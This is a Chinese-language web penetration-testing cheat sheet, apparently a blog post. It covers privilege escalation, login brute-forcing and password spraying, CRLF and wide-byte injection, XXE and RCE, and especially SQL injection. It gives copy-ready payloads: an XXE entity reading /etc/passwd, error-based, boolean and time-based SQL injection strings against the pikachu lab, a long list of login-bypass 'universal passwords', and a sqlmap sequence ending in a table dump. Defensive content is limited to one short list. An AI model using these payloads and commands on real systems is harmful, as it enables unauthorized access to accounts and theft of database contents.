**常见修改参数**
如果有水平越权，常见修改数据包的参数有 uid、用户名、cookie的uid值也可以尝试修改的

**敏感操作**
通常在于你在登录自己账号时，去通过修改参数登录了别人的账号.
或你在登录你的主页后尝试切换别人的id
**发现其他用户**
用户名

> 在注册时如果提示已存在用户 
> 用户的评论等与网页的交互

看id
> 看用户传送到网页端的地址图像等可能含有他的ID
>  看用户主页一般都有ID


#### 垂直越权
前提条件：获取的添加用户的数据包
怎么来的数据包：
1.普通用户前端有操作界面可以抓取数据包
2.通过网站源码本地搭建自己去模拟抓取
3.盲猜
#### 待补充：工具
寻找最好用的越权检测工具
**在burpsuite装authz**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712220713456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 防御
1.前后端同时对用户输入信息进行校验，双重验证机制
2.调用功能前验证用户是否有权限调用相关功能
3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限
4.直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理
5.永远不要相信来自用户的输入，对于可控参数进行严格的检测与过滤

### 登录脆弱
3.Cookie脆弱点验证
4.Session固定点测试
5.验证密文比对安全测试
#### 登陆点暴力破解
##### 什么网站登录点可以进行暴力破解

 - 服务器端没有做限制，而比如银行卡号密码就做了限制，如果攻击次数超过3，那么卡将被冻结，或者某IP尝试登录次数超过阈值，IP将被锁定
 - 没有做登录验证或被验证能被绕过
 -明文传输或加密方式被你破解，其中大部分http都是明文传输，大部分https都是加密传输

##### 准备字典
你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选, 除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作；

**搜集更多信息以及生成他们字典**
https://whois.domaintools.com
http://whois.chinaz.com/
密码爆破如此
whois 查询到所登记的联络人信息，通常是网域管理员，收集他的**个人邮箱**作为密码爆破猜解对象之一。


推荐crunch和cupp，kali中都有，自己也可以根据需要写一些脚本

很多大佬都有几十个G的密码爆破字典，但大家在网上真的很难搜得到，搜得到的大多都是那些随机生成的密码，不具有意义。
在线字典生成器
https://www.bugku.com/mima/


首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool
爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:
https://xz.aliyun.com/t/7823
##### 暴力破解
要是获得已知用户名的hash密码也能破解，具体做法是通过hashid识别hash类型，将用户名和你尝试的密码一一结合起来看是否hash值相等，相等即破解成功。这两种方法都是属于暴力破解，只不过一个是在线的一个是离线的，你仍旧都可以使用hydra破解


**hydra进行暴力破解**

hydra爆破工具，在kali有集成。在kali上有个默认密码字典位于`/usr/share/wordlists`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603153641755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210519202219784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

类似工具：snetcrack、超级弱口令


##### 其他登陆点攻击
**密码喷洒攻击**
基本上，密码爆破是用多个密码尝试破解同一个 ID。而密码喷洒攻击，是用一个密码来尝试多个用户ID，以便至少有一个用户 ID 被泄露。对于密码喷洒攻击，黑客使用社交工程或其他网络钓鱼方法收集多个用户 ID。通常情况下，至少有一个用户使用简单的密码，如12345678甚至是 p@ssw0rd。在密码喷洒攻击中，黑客会为他或她收集的所有用户 ID 应用精心构造的密码。因此，密码喷洒攻击可以定义为将相同的密码应用于组织中的多个用户帐户，目的是安全的对其中一个帐户进行未授权访问。暴力破解的问题在于，在使用不同密码进行一定次数的尝试后，系统可能会被锁定。为了避免这种情况，产生了收集用户 ID 并将可能的密码应用于它们的想法。使用密码喷洒攻击时，黑客也会采取一些预防措施。例
如，如果他们尝试将 password1应用于所有用户帐户，则在完成第一轮后，他们不会立即开始将password2应用于这些帐户。他们将在黑客攻击中留出至少30分钟的时间。参考资料：Password Spray Attack Definition and Defending yourself
**重置密码漏洞**
常见方式：通过Session覆盖漏洞重置他人密码
**AI破解**



## CRLF 注入

**简介**
难度：低

通常用在：分享链接
拓展思路：对客户端的攻击，比如投票、跳转、关注等；
绕过安全防护软件；


**实战**

测试链接：

会话固定、XSS、缓存病毒攻击、日志伪造

## 宽字节注入

远古网站还有此漏洞

宽字节注入时利用mysql的一个特性，使用GBxxx编码的时候，会认为两个字符是一个汉字
在%df遇到%5c时，由于%df的ascii大于128，所以会自动拼接%5c，吃掉反斜线。而%27 %20小于ascii(128)的字符就会保留。通常都会用反斜线来转义恶意字符串，但是如果被吃掉后，转义失败，恶意的xss代码可以继续运行。
反斜杠的GBxxx编码为%5C，根据GBxxx编码在前面加上%DE，%DF，%E0。。。都可以组成一个汉字，从而把反斜杠这个转义字符给吃了
%27---------单引号

%20----------空格

%23-----------#号

%5c------------/反斜杠

php中有一个转义字符
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210511175255628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210511175404953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## XXE

### 学习资料

[【FreeBuf字幕组】WEB安全漏洞介绍-XML外部实体注入攻击（XXE）](https://www.bilibili.com/video/BV1at41177SA/)

### XXE 基础

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623192405589.png)

XML 指可扩展标记语言（EXtensible Markup Language），它是用于存储和传输数据的最常用的语言。和HTML很像，但区别是HTML与数据表示有关，XML与数据传输和存储有关。它是一种自我描述语言。它不包含任何预定义的标签，如 <p>、<img> 等。所有标签都是用户定义的，具体取决于它所代表的数据。<email></email>、<message></message> 等
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623195711317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
DTD会定义实体部分，实体部分对于XML就像是变量，但他不仅是变量，还可以用来调用本地文件1.txt或外部实体https://baidu.com。正因为这里实体有这么强大的功能，因此也容易被攻击。DTD通常有三种类型实体：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623195947277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623195858217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623200053312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623200145800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623203909858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### XXE 攻击

许多网站在数据的字符串和传输中使用 XML，如果不采取对策，那么这些信息将受到损害。可能的各种攻击是：
inband
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623213839678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

error
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623213908352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

oob
无输出，必须要执行一些带外请求才能吧目标数据提取出来
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623213937334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623214220130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623214853494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


服务器端请求伪造
拒绝服务攻击
远程代码执行
跨站脚本
XXE 的 CVSS 评分为7.5，其严重程度为中等，具有 -

CWE-611：对 XML 外部实体的不当限制。
CVE-2019-12153：本地文件 SSRF
CVE-2019-12154：远程文件 SSRF
CVE-2018-1000838：十亿笑攻击（DDOS）
CVE-2019-0340：通过文件上传的 XXE

#### 远程文件 SSRF

这些文件是攻击者注入远程托管的恶意脚本以获得管理员访问权限或关键信息的文件。我们将尝试获取/etc/passwd为此我们将输入以下命令。

```bash
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE reset [ 
<!ENTITY ignite SYSTEM "file:///etc/passwd"> 
]><reset><login>&ignite;</ login><secret>有任何错误吗？</secret></reset>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604120133412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
输入上述命令后，只要我们点击发送按钮，我们就会看到 passwd 文件！！
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604131802628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### XXE 亿笑攻击-DOS

“第一次进行这种攻击时，攻击者使用lol作为实体数据，并在随后的几个实体中多次调用它。执行时间呈指数级增长，结果是一次成功的 DoS 攻击导致网站瘫痪。由于使用 lol 并多次调用它导致了数十亿个请求，我们得到了“Billion Laugh Attack”这个名字
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604115827776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
在这里，我们看到在1 处，我们已经声明了名为“ ignite”的实体，然后在其他几个实体中调用了 ignite，从而形成了一个回调链，这将使服务器过载。在2 处，我们调用了实体&ignite9; 我们已经调用 ignite9 而不是 ignite，因为 ignite9 多次调用 ignite8，每次调用 ignite8 时都会启动 ignite7，依此类推。因此，请求将花费指数级的时间来执行，结果，网站将关闭。
以上命令导致 DoS 攻击，我们得到的输出是：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604115949948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



## RCE（远程命令执行）
在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞比如eval().或者一些参数id可以执行echo &id等命令。
当遇到这种漏洞，你可以执行一些敏感命令。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712125552200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712135852588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 实例：网站可执行系统命令
当只允许执行某命令试试管道符。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712125738973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
当弹出这样对话框时，你应该试着去看当前页面的源码，检查是哪个函数导致此结果。
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071213025048.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
前端验证的你可以通过抓包去修改发送的数据包，从而绕过防御
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712131116302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



## 数据库注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705145349351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

 -- limit()、concat()、group_concat()、Substr()、Ascii()、Left()
 -- length()、updataxml()等等吧


hex编码绕过

SQL头注入点


Cookie

X-FOR-I

### 基本知识

**经验：传入不同参数**
当参数为字符型时系统默认带上单引号。当然如果程序员特立独行，也是可以使用`id='1'`的 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705220943443.png)
字符型参数的注入你首先要先对前面的单引号或双引号进行闭合。具体是单引号还是双引号，你要去分析
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705231038748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

****

模糊查询。这种注入需要过滤百分号和单引号
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705221856313.png)



**经验：多个参数注入一个点**
如果链接是 url/?id=1&page=2
id存在注入点，page不存在。这时候你的注入应该采取以下策略：

1. 交换顺序。将url/?id=1&page=2换成url/?page=2&id=1
2. 注入语句插对位置。url/?id=1 and 1=1 &page=2

对于工具你应该告诉它注入点位置，即加一个星号

```bash
url/?id=1*&page=2
```

**权限提取**
如果你注入用户root那你相当于获得了数据库所有表的权限，。但有的网站为了安全，是一个页面一个数据库用户，当你获得这个用户的权限，是无法得到整个数据库的权限的![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070517463665.png)


### 制造回显

当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好地选择对应的注入语句。


select 查询数据
在网站应用中进行数据显示查询效果
例： select * from news wher id=$id

insert 插入数据
在网站应用中进行用户注册添加等操作
例：insert into news(id,url,text) values(2,'x','$t')

delete 删除数据
后台管理里面删除文章删除用户等操作
例：delete from news where id=$id

update 更新数据
会员或后台中心数据同步或缓存等操作
例：update user set pwd='$p' where id=2 and username='admin'

order by 排列数据
一般结合表名或列名进行数据排序操作
例：select * from news order by $id
例：select id,name,price from news order by $order

一般而言除了select，其他数据库操作都无回显

#### 报错回显

SQL注入报错盲注
盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：

基于布尔的SQL盲注-逻辑判断(不需要回显信息就能看到)(2)
regexp，like，ascii，left，ord，mid

基于时间的SQL盲注-延时判断(不需要回显信息就能看到)(3)
if，sleep

基于报错的SQL盲注-报错回显(优先于选择:1)
floor
payload:
pikachu  insert
username=x' or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or '
&password=xiaodi&sex=%E7%94%B7&phonenum=13878787788&email=wuhan&add=hubei&submit=submit

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122142210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122150246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122157836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122212555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


updatexml
username=x ' or updatexml(1,concat(0x7e,(version())),0) or ' &password=xiaodi&sex=%E7%94%B7&phonenum=13878787788&email=wuhan&add=hubei&submit=submit
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707122235679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


extractvalue
username=x ' or extractvalue(1,concat(0x7e,database())),0) or ' &password=xiaodi&sex=%E7%94%B7&phonenum=13878787788&email=wuhan&add=hubei&submit=submit

pikachu updata
sex=%E7%94%B7&phonenum=13878787788&and=hubeNicky' or (select 1 from(select count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '&email=wuhan&submit=submit

sex=%E7%94%B7&phonenum=13878787788&and=hubeNicky' or updataexml(1,concat(0x7e,(version())),0) or '&email=wuhan&submit=submit

sex=%E7%94%B7&phonenum=13878787788&and=hubeNicky' or extractbalue(1,concat(0x7e,database())) or '&email=wuhan&submit=submit

pikachu delete
/pikachu/vul/sqli/sqli_del.php?id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)

/pikachu/vul/sqli/sqli_del.php?id=56+or+updatexml+(1,concat(0x7e,database()),0)

/pikachu/vul/sqli/sqli_del.php?id=56+or+extractvalue+(1,concat(0x7e,database()))

##### bool类型注入

基于布尔的 SQL 注入要求攻击者向数据库服务器发送一系列布尔查询并分析结果，以推断任何给定字段的值。假设我们发现了一个容易受到盲注攻击的字段，我们想找出用户名。为了做到这一点，我们需要了解一些重要的功能；大多数数据库使用这些的一些变体：
ASCII(character)
SUBSTRING(string, start, length)
LENGTH(string)

###### 制作布尔查询

**慢慢尝试**
通过使用这些函数，我们可以开始测试第一个字符的值，一旦确定，我们就可以继续下一个，依此类推，直到整个值（在这种情况下，用户名）被发现。看看下面的 URL，我们知道它很容易通过插入尾随单引号被注入：

```bash
https://exampleurl.com/login.php?id=1'
```

使用布尔漏洞利用，我们可以制作要在服务器上执行的查询，最终看起来像这样：

```bash
SELECT  *
FROM    Users
WHERE   UserID = '1' AND ASCII(SUBSTRING(username,1,1)) = 97 AND '1' = '1'
```

让我们分解一下。内部函数总是先执行，所以 SUBSTRING() 取用户名字符串的第一个字符并将长度限制为 1；这样，我们可以一次遍历每个字符，直到到达字符串的末尾。

接下来，ASCII() 函数以我们刚获得的字符作为参数运行。语句的其余部分基本上只是一个条件：如果这个字符的 ASCII 值等于 97（即“a”），并且 1=1 为真（它总是如此），那么整个语句是真的，我们有正确的性格。如果返回 false，那么我们可以将 ASCII 值从 97 增加到 98，并重复该过程直到它返回 true。
通过在终端中输入man ascii可以访问一个方便的 ASCII 表：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603174843546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

例如，如果我们知道用户名是“jsmith”，那么在达到 106（即“j”的 ASCII 值）之前，我们不会看到返回 true。一旦我们获得了用户名的第一个字符，我们就可以通过重复此过程并将 SUBSTRING() 的起始位置设置为 2 来继续下一个字符
**结束程序**
测试基于布尔的注入时需要做的最后一件事是确定何时停止，即知道字符串的长度。一旦我们达到空值（ASCII 代码 0），那么我们要么完成并发现整个字符串，要么字符串本身包含一个空值。我们可以通过使用 LENGTH() 函数来解决这个问题。假设我们试图获取的用户名是“jsmith”，那么查询可能如下所示：

```bash
SELECT  *
FROM    Users
WHERE   UserID = '1' AND LENGTH(username) = 6 AND '1' = '1'
```

如果返回 true，则我们已成功识别用户名。如果返回 false，则字符串包含空值，我们需要继续该过程，直到发现另一个空字符。

##### 时间SQL注入

IF() 函数接受三个参数：条件、条件为真时返回什么、条件为假时返回什么。
MySQL 还有一个名为 BENCHMARK() 的函数，可用于基于时间的注入攻击。将执行表达式的次数作为其第一个参数，将表达式本身作为第二个参数。

###### 制作时间SQL注入

基于时间的 SQL 注入涉及向数据库发送请求并分析服务器响应时间以推断信息。我们可以通过利用数据库系统中使用的睡眠和时间延迟功能来做到这一点。像以前一样，我们可以使用 ASCII() 和 SUBSTRING() 函数来帮助枚举字段以及名为 SLEEP() 的新函数。让我们检查以下发送到服务器的 MySQL 查询：

```bash
SELECT  *
FROM    Users
WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, SLEEP(10), 'false')
```

基本上，这表明如果用户名的第一个字符是“a”(97)，则运行 CURTIME() 一千万次。CURTIME() 返回当前时间，但这里传递的函数并不重要；但是，重要的是要确保该函数运行足够多的时间以产生重大影响。

```bash
WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, BENCHMARK(10000000, CURTIME()), 'false')

```

###### 其他数据库的时间注入

PostgreSQL 使用 pg_sleep() 函数：

```bash
WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, pg_sleep(10), 'false')

```


Oracle 更具挑战性，因为注入睡眠函数通常需要在PL/SQL块中完成。PL/SQL 是 Oracle 对 SQL 的扩展，其中包括过程编程语言的元素。它不太可能发生，但基于时间的注入看起来像这样：

```bash
BEGIN DBMS_LOCK.SLEEP(15); END;

```

### 使用万能密码对登录页注入

产生原因是管理员都会用户输入的用户名和密码进行数据库查询操作。
由于是字符串查询，由前文可知字符串注入都需要闭合引号。

```bash
asp aspx万能密码
1： "or "a"="a
2： ')or('a'='a
3：or 1=1--
4：'or 1=1--
5：a'or' 1=1--
6： "or 1=1--
7：'or'a'='a
8： "or"="a'='a
9：'or''='
10：'or'='or'
11: 1 or '1'='1'=1
12: 1 or '1'='1' or 1=1
13: 'OR 1=1%00
14: "or 1=1%00
15: 'xor
16: 新型万能登陆密码

用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
密码 1
Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
Password=1

17..admin' or 'a'='a 密码随便


PHP万能密码

'or'='or'

'or 1=1/* 字符型 GPC是否开都可以使用

User: something
Pass: ' OR '1'='1

jsp 万能密码

1'or'1'='1

admin' OR 1=1/*

用户名：admin 系统存在这个用户的时候 才用得上
密码：1'or'1'='1
pydictor、cupp、crunch字典生成工具、自写字典生成py（小黑的人名字典py）；
dymerge字典合并去重工具、自己写去重py；
```

#### 用户名不存在

先爆破用户名，再利用被爆破出来的用户名爆破密码。
其实有些站点，在登陆处也会这样提示
所有和数据库有交互的地方都有可能有注入。

**什么也不被过滤**

```bash
什么也不被过滤时，使用已知用户名登录
输入  用户名 admin' and 1=1 #  密码随便输入
当什么都没被过滤时，只是这种网站已经寥寥无几了
select * from admin where username='admin' and 1=1 #' and password='123456' OR 
```

```bash
什么也不被过滤时，不知道用户名登录（知道用户名和不知道区别在于是使用and还是or）
输入   用户名  admin'or 1 #    密码随便输入
当什么都没被过滤时，只是这种网站已经寥寥无几了
select * from admin where username='admin'or 1 #' and password='123456' 
```

**发现'没有被过滤，or，--+，#被过滤**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210518203512468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

```bash
输入  用户名 reborn'='  密码 reborn'='
select * from user where username='reborn'='' and password='reborn'=''
```

**空格被过滤**

>利用URL对制表符的转义将空格替代为%09
>
>sql注入常常在URL地址栏、登陆界面、留言板、搜索框等。这往往给骇客留下了可乘之机。轻则数据遭到泄露，重则服务器被拿下。。攻击者甚至能够完成远程命令执行。这是最常见的一个话题了，网上有很多帮助初学者的且全的小白文章[这篇还行](https://www.anquanke.com/post/id/235970)
>![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050719180262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



**SQL注入步骤**
[sql注入实例，靶机测试实例详细,适合新手](https://www.cnblogs.com/shenggang/p/12144945.html)
[招聘网站sql注入](https://www.cnblogs.com/shenggang/p/12144945.html)

#### 1. 判断是否存在注入点

判断注入点的方法很多，只要一个返回真一个返回假就可以，如下也可以进行判断。如果你总尝试什么and 1=1 与and 1=2 你的请求很容易被拦截
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705150513612.png)

#### 2. 判断列数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151215106.png)


#### 3. 信息搜集

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151433704.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070516233053.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705162639732.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705162748179.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705162828198.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705180805985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705181025600.png)


*access就没有什么数据库版本，数据库名给你查，也没有infomation_schema给你，因此只能靠暴力猜。但是其他sql语句都是一样的。如下几个语句都是猜的*
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706113950703.png)

### sql注入过程：手工/sqlmap

sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。
 使用sqlmap 步骤是：

```python
# 1.判断链接是否可注入
# 手工:当你想要寻找界面是否含有注入点，你应该警惕源码中含有?的URL链接测试比如？id=1和？id=1'看界面返回区别，或者是附上？id=1 and 1=1 和？id=1 and 1=2；或者是+1 和-1 注意这里+在url编码中有特殊含义，记得将+编码为%2b
sqlmap -u URL --level 5 --batch --random-agent#  当url参数大于1时需要将url用“”引起来。


# 2. 如果可注入，查询当前用户下所有数据库。不可注入的话，就没有后续步骤了。
# 手工: order by 3
# 手工: id=-1 union select 1, database(), 3 # UNION的作用是将两个select查询结果合并
sqlmap -u URL --dbs # --dbs也可以缩写为-D

# 3. 如果可查询到数据库，则进行查询数据库中表名
sqlmap -u URL -D 数据库名  --tables # --tables可以缩写为-T

# 4.规则同上
sqlmap -u URL -D 数据库名  -T 表名 --columns 


# 5.规则同上，字段内容
sqlmap -u URL -D 数据库名  -T 表名  -C 列名 --dump
```

其他有用命令

```python
sqlmap -u URL --users
